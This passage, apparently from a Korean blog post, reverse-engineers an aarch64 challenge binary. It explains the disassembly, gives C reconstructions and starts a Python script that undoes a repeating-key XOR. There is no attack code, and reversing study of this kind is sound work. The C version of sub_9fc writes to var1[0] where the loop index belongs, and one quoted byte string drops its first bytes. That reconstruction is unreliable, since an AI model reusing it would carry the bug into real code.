class="hljs-keyword">x</span><span class="hljs-number">1</span>                    // <span class="hljs-symbol">#1</span> <span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span>:   d<span class="hljs-number">2800260</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">13</span>                   // <span class="hljs-symbol">#19</span> <span class="hljs-keyword">c</span><span class="hljs-number">60</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">0</span>    bl  <span class="hljs-number">7e0</span> &lt;calloc<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">64</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">68</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">94</span>    bl  ab<span class="hljs-number">8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">51</span>    bl  <span class="hljs-number">9</span>b<span class="hljs-number">0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">70</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">74</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>e    bl  <span class="hljs-number">96</span><span class="hljs-keyword">c</span> &lt;sub_<span class="hljs-number">96</span><span class="hljs-keyword">c</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">78</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">90000000</span>    adrp    <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-number">0</span> &lt;_init<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">760</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">80</span>:   <span class="hljs-number">9138</span>a<span class="hljs-number">000</span>    <span class="hljs-keyword">add</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span>              // <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> &#x27;<span class="hljs-symbol">%s</span>&#x27; <span class="hljs-keyword">c</span><span class="hljs-number">84</span>:   <span class="hljs-number">97</span>fffeeb    bl  <span class="hljs-number">830</span> &lt;__isoc<span class="hljs-number">99</span>_scanf<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">88</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">90</span>:   <span class="hljs-number">97</span>ffffa<span class="hljs-number">8</span>    bl  b<span class="hljs-number">30</span> &lt;sub_b<span class="hljs-number">30</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">94</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">98</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">2</span>    bl  <span class="hljs-number">820</span> &lt;<span class="hljs-keyword">free</span><span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">52800000</span>    mov w<span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span>                    // <span class="hljs-symbol">#0</span> ca<span class="hljs-number">0</span>:   a<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">27</span>bfd    ldp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp], <span class="hljs-symbol">#32</span> ca<span class="hljs-number">4</span>:   d<span class="hljs-number">65</span>f<span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>    <span class="hljs-keyword">ret</span></code></pre><p>main 함수를 보면 <code>sp + #16</code>에 calloc(0x13,1)을 해주고 <code>sub_ab8</code>함수가 호출된 후 나온 값을 인자로 <code>sub_9b0</code> 함수가 실행된 후 <code>sp + #24</code>에 저장합니다. 그 후 <code>sub_96c</code> 함수를 호출하고 값을 받아서<code>sp+#16</code>에 넣어주고  <code>sub_9b0(sub_ab8())</code> 한 값과 input 값을 인자로 <code>sub_b30</code> 함수를 호출하고 프로그램이 종료됩니다. 해당 함수를 c 코드로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>sub_ab8</code>과 <code>sub_9b0</code> 함수를 살펴봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value0</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">96</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">99</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span><span class="hljs-attribute">value1</span>  DCB <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>xFC, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">79</span>, <span class="hljs-number">0</span>xFF,<span class="hljs-attribute">0x73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>D, <span class="hljs-number">0</span>xF<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>xE<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-attribute">0xEC</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x<span class="hljs-number">63</span>, <span class="hljs-number">0</span>x<span class="hljs-number">46</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>xDA, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>,<span class="hljs-attribute">0x57</span>, <span class="hljs-number">0</span>xD<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">51</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>xD<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>xD<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">49</span>, <span class="hljs-number">0</span>x<span class="hljs-number">56</span>,<span class="hljs-attribute">0x43</span>, <span class="hljs-number">0</span>xCA, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">57</span>, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">41</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>xA<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">28</span>, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>,<span class="hljs-attribute">0x22</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">31</span>, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span><span class="hljs-attribute">0000000000000ab8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt;: <span class="hljs-attribute">ab8</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> abc:   910003fd    mov x29, sp</span><span class="hljs-meta"> ac0:   52800103    mov w3, #0x8                    // #8</span><span class="hljs-meta"> ac4:   90000000    adrp    x0, value0@page</span><span class="hljs-meta"> ac8:   9136e002    add x2, x0, value0@pageoff</span><span class="hljs-meta"> acc:   528007c1    mov w1, #0x3e                   // #62</span><span class="hljs-meta"> ad0:   90000000    adrp    x0, value1@page</span><span class="hljs-meta"> ad4:   91372000    add x0, x0, value1@pageoff</span><span class="hljs-meta"> ad8:   97ffffc9    bl  9fc &lt;sub_9fc&gt;</span><span class="hljs-meta"> adc:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">ae0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ae4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> ae8:   d65f03c0    ret</span></code></pre><p>aarch64의 calling convention은 <code>x0</code>, <code>x1</code>, <code>x2</code>, <code>x3</code> 이므로 인자에 value1, 0x3e, value0, 0x8을 넣어 <code>sub_9fc</code>를 호출합니다. 호출하고 난 후 연산된 문자열을 return 해줍니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009b0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt;: <span class="hljs-attribute">9b0</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> 9b4:   910003fd    mov x29, sp</span><span class="hljs-meta"> 9b8:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">9bc</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9c0</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">78</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">9c4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">9c8</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">7</span>e    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">9cc</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d4</span>:   f<span class="hljs-number">100001</span>f    cmp x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> <span class="hljs-attribute">9d8</span>:   <span class="hljs-number">54000061</span>    b.ne    <span class="hljs-number">9</span>e<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;  // b.any <span class="hljs-attribute">9dc</span>:   d<span class="hljs-number">2800000</span>    mov x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>                // #<span class="hljs-number">0</span> <span class="hljs-attribute">9e0</span>:   <span class="hljs-number">14000005</span>    b   <span class="hljs-number">9</span>f<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt; <span class="hljs-attribute">9e4</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9e8</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9ec</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">95</span>    bl  <span class="hljs-number">840</span> &lt;strcpy@plt&gt; <span class="hljs-attribute">9f0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9f4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> 9f8:   d65f03c0    ret</span></code></pre><p><code>sub_ab8</code>에서 반환한 문자열을 받아서 길이를 계산한 후 <code>malloc</code> 해줍니다. 할당한 주소가 0이라면 0을 반환해주고, 아니면 <code>strcpy</code>를 통해 <code>sub_ab8</code>에서 온 문자열을 복사하여 return 해줍니다.</p><p>이제 <code>sub_9fc</code> 함수를 분석을 해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009fc</span> &lt;sub_<span class="hljs-number">9</span>fc&gt;: <span class="hljs-attribute">9fc</span>:   a<span class="hljs-number">9</span>bc<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-64]!</span><span class="hljs-meta"> a00:   910003fd    mov x29, sp</span><span class="hljs-meta"> a04:   f90017e0    str x0, [sp, #40]</span> <span class="hljs-attribute">a08</span>:   b<span class="hljs-number">90027</span>e<span class="hljs-number">1</span>    str w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a0c</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">2</span>    str x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a10</span>:   b<span class="hljs-number">90023</span>e<span class="hljs-number">3</span>    str w<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a14</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a18</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a1c</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">68</span>    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">a24</span>:   f<span class="hljs-number">9001</span>fe<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a28</span>:   b<span class="hljs-number">98027</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a2c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a30</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a34</span>:   <span class="hljs-number">3900001</span>f    strb    wzr,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a38</span>:   b<span class="hljs-number">90037</span>ff    str wzr,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a3c</span>:   <span class="hljs-number">14000018</span>    b   a<span class="hljs-number">9</span>c &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>xa<span class="hljs-number">0</span>&gt; <span class="hljs-attribute">a40</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a44</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">a48</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a4c</span>:   <span class="hljs-number">39400002</span>    ldrb    w<span class="hljs-number">2</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a50</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a54</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a58</span>:   <span class="hljs-number">1</span>ac<span class="hljs-number">10</span>c<span class="hljs-number">03</span>    sdiv    w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a5c</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a60</span>:   <span class="hljs-number">1</span>b<span class="hljs-number">017</span>c<span class="hljs-number">61</span>    mul w<span class="hljs-number">1</span>, w<span class="hljs-number">3</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a64</span>:   <span class="hljs-number">4</span>b<span class="hljs-number">010000</span>    sub w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a68</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a6c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a70</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a74</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a78</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a7c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">3</span>    ldr x<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a80</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000060</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">3</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a84</span>:   <span class="hljs-number">4</span>a<span class="hljs-number">010041</span>    eor w<span class="hljs-number">1</span>, w<span class="hljs-number">2</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a88</span>:   <span class="hljs-number">12001</span>c<span class="hljs-number">21</span>    and w<span class="hljs-number">1</span>, w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>xff <span class="hljs-attribute">a8c</span>:   <span class="hljs-number">39000001</span>    strb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a90</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a94</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a98</span>:   b<span class="hljs-number">90037</span>e<span class="hljs-number">0</span>    str w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a9c</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">aa0</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">aa4</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">aa8</span>:   <span class="hljs-number">54</span>fffccb    b.lt    a<span class="hljs-number">40</span> &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt;  // b.tstop <span class="hljs-attribute">aac</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">ab0</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">47</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #64</span><span class="hljs-meta"> ab4:   d65f03c0    ret</span></code></pre><p>인자로 받은 값을 차례대로 스택에 저장합니다. <code>w1</code>과 <code>w3</code>은 데이터의 길이로 추정되므로 <code>x0</code>, <code>x2</code>에 들어온 값을 보면 <code>[sp + #40] = \xFC\x7F\x65\x79\xFF\x73\x6C\x7D\xF4\x77\x6D\x61\xE7\x6B\x74\x65\xEC\x6F\x75\x69\xEF\x63\x46\x53\xDA\x5D\x47\x57\xD1\x51\x4E\x5B\xD2\x55\x4F\x5F\xD9\x49\x56\x43\xCA\x4D\x57\x47\xC1\x41\x5E\x4B\xA9\x28\x30\x22\xA2\x2C\x31\x26\xA1\x20</code>, <code>[sp + #24] = \x96\x19\x7\x11\x99\x19\x2\x11</code> 이 됩니다. 스택에 값을 저장한 후 첫 번째 인자의 길이+1 만큼 <code>malloc</code>을 해준 후 <code>sp+#56</code>에 저장합니다. 그 후 첫 번째 인자의 길이를 가져와서 <code>malloc</code>한 주소의 마지막 index에 0x0을 넣어주고 <code>sp+#52</code>에 0을 저장해준 후 <code>a9c</code>로 이동합니다.</p><p><code>a9c</code>에서는 0을 <code>w1</code>에 넣고 첫 번째 문자열의 길이를 <code>w0</code>에 불러온 후 두 개를 비교하여 <code>a40</code>으로 이동합니다. <code>w1=w0</code>이 되면 <code>flag</code>가 <code>0</code>으로 세팅되고 <code>b.lt</code> 연산이 수행되지 않으므로 첫 번째 문자열의 길이만큼 반복하는 구간임을 알 수 있습니다. <code>a40</code>에서 <code>[sp+#40 + sp+#52]</code>의 값을 <code>w2</code>에 넣고 <code>w3</code>에는 <code>sp+#52 - sp+#32 * (sp+#52 / sp+#32)</code> 연산을 통해 <code>sp+#52 % sp+#32</code> 를 수행한 후 해당 주소의 값을 가져와서 두 문자열을 <code>xor</code> 연산합니다.</p><p><code>sub_9fc</code> 를 c로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// sub_9fc</span><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sub_9fc</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* param1, <span class="hljs-keyword">int</span> param2, <span class="hljs-keyword">char</span>* param3, <span class="hljs-keyword">int</span> param4)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span>* var1 = <span class="hljs-built_in">malloc</span>(param2 + <span class="hljs-number">1</span>);    var1[param2] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; param2; i++)    &#123;        var1[<span class="hljs-number">0</span>] = (param1[i] ^ param3[i % param4]) &amp; <span class="hljs-number">0xff</span>;    &#125;    <span class="hljs-keyword">return</span> var1;&#125;</code></pre><p>해당 문자열들이 <code>sub_9fc</code>를 거쳐 어떠한 값이 나오는지 구하는 python 스크립트는 아래와 같습니다.</p><pre><code class="hljs python">string1 = [    <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xFF</span>,    <span class="hljs-number">0x73</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>,    <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x47</span>,    <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x56</span>,    <span class="hljs-number">0x43</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x30</span>,    <span class="hljs-number">0x22</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x20</span>]string2 = [<span class="hljs-number">0x96</span>, <span 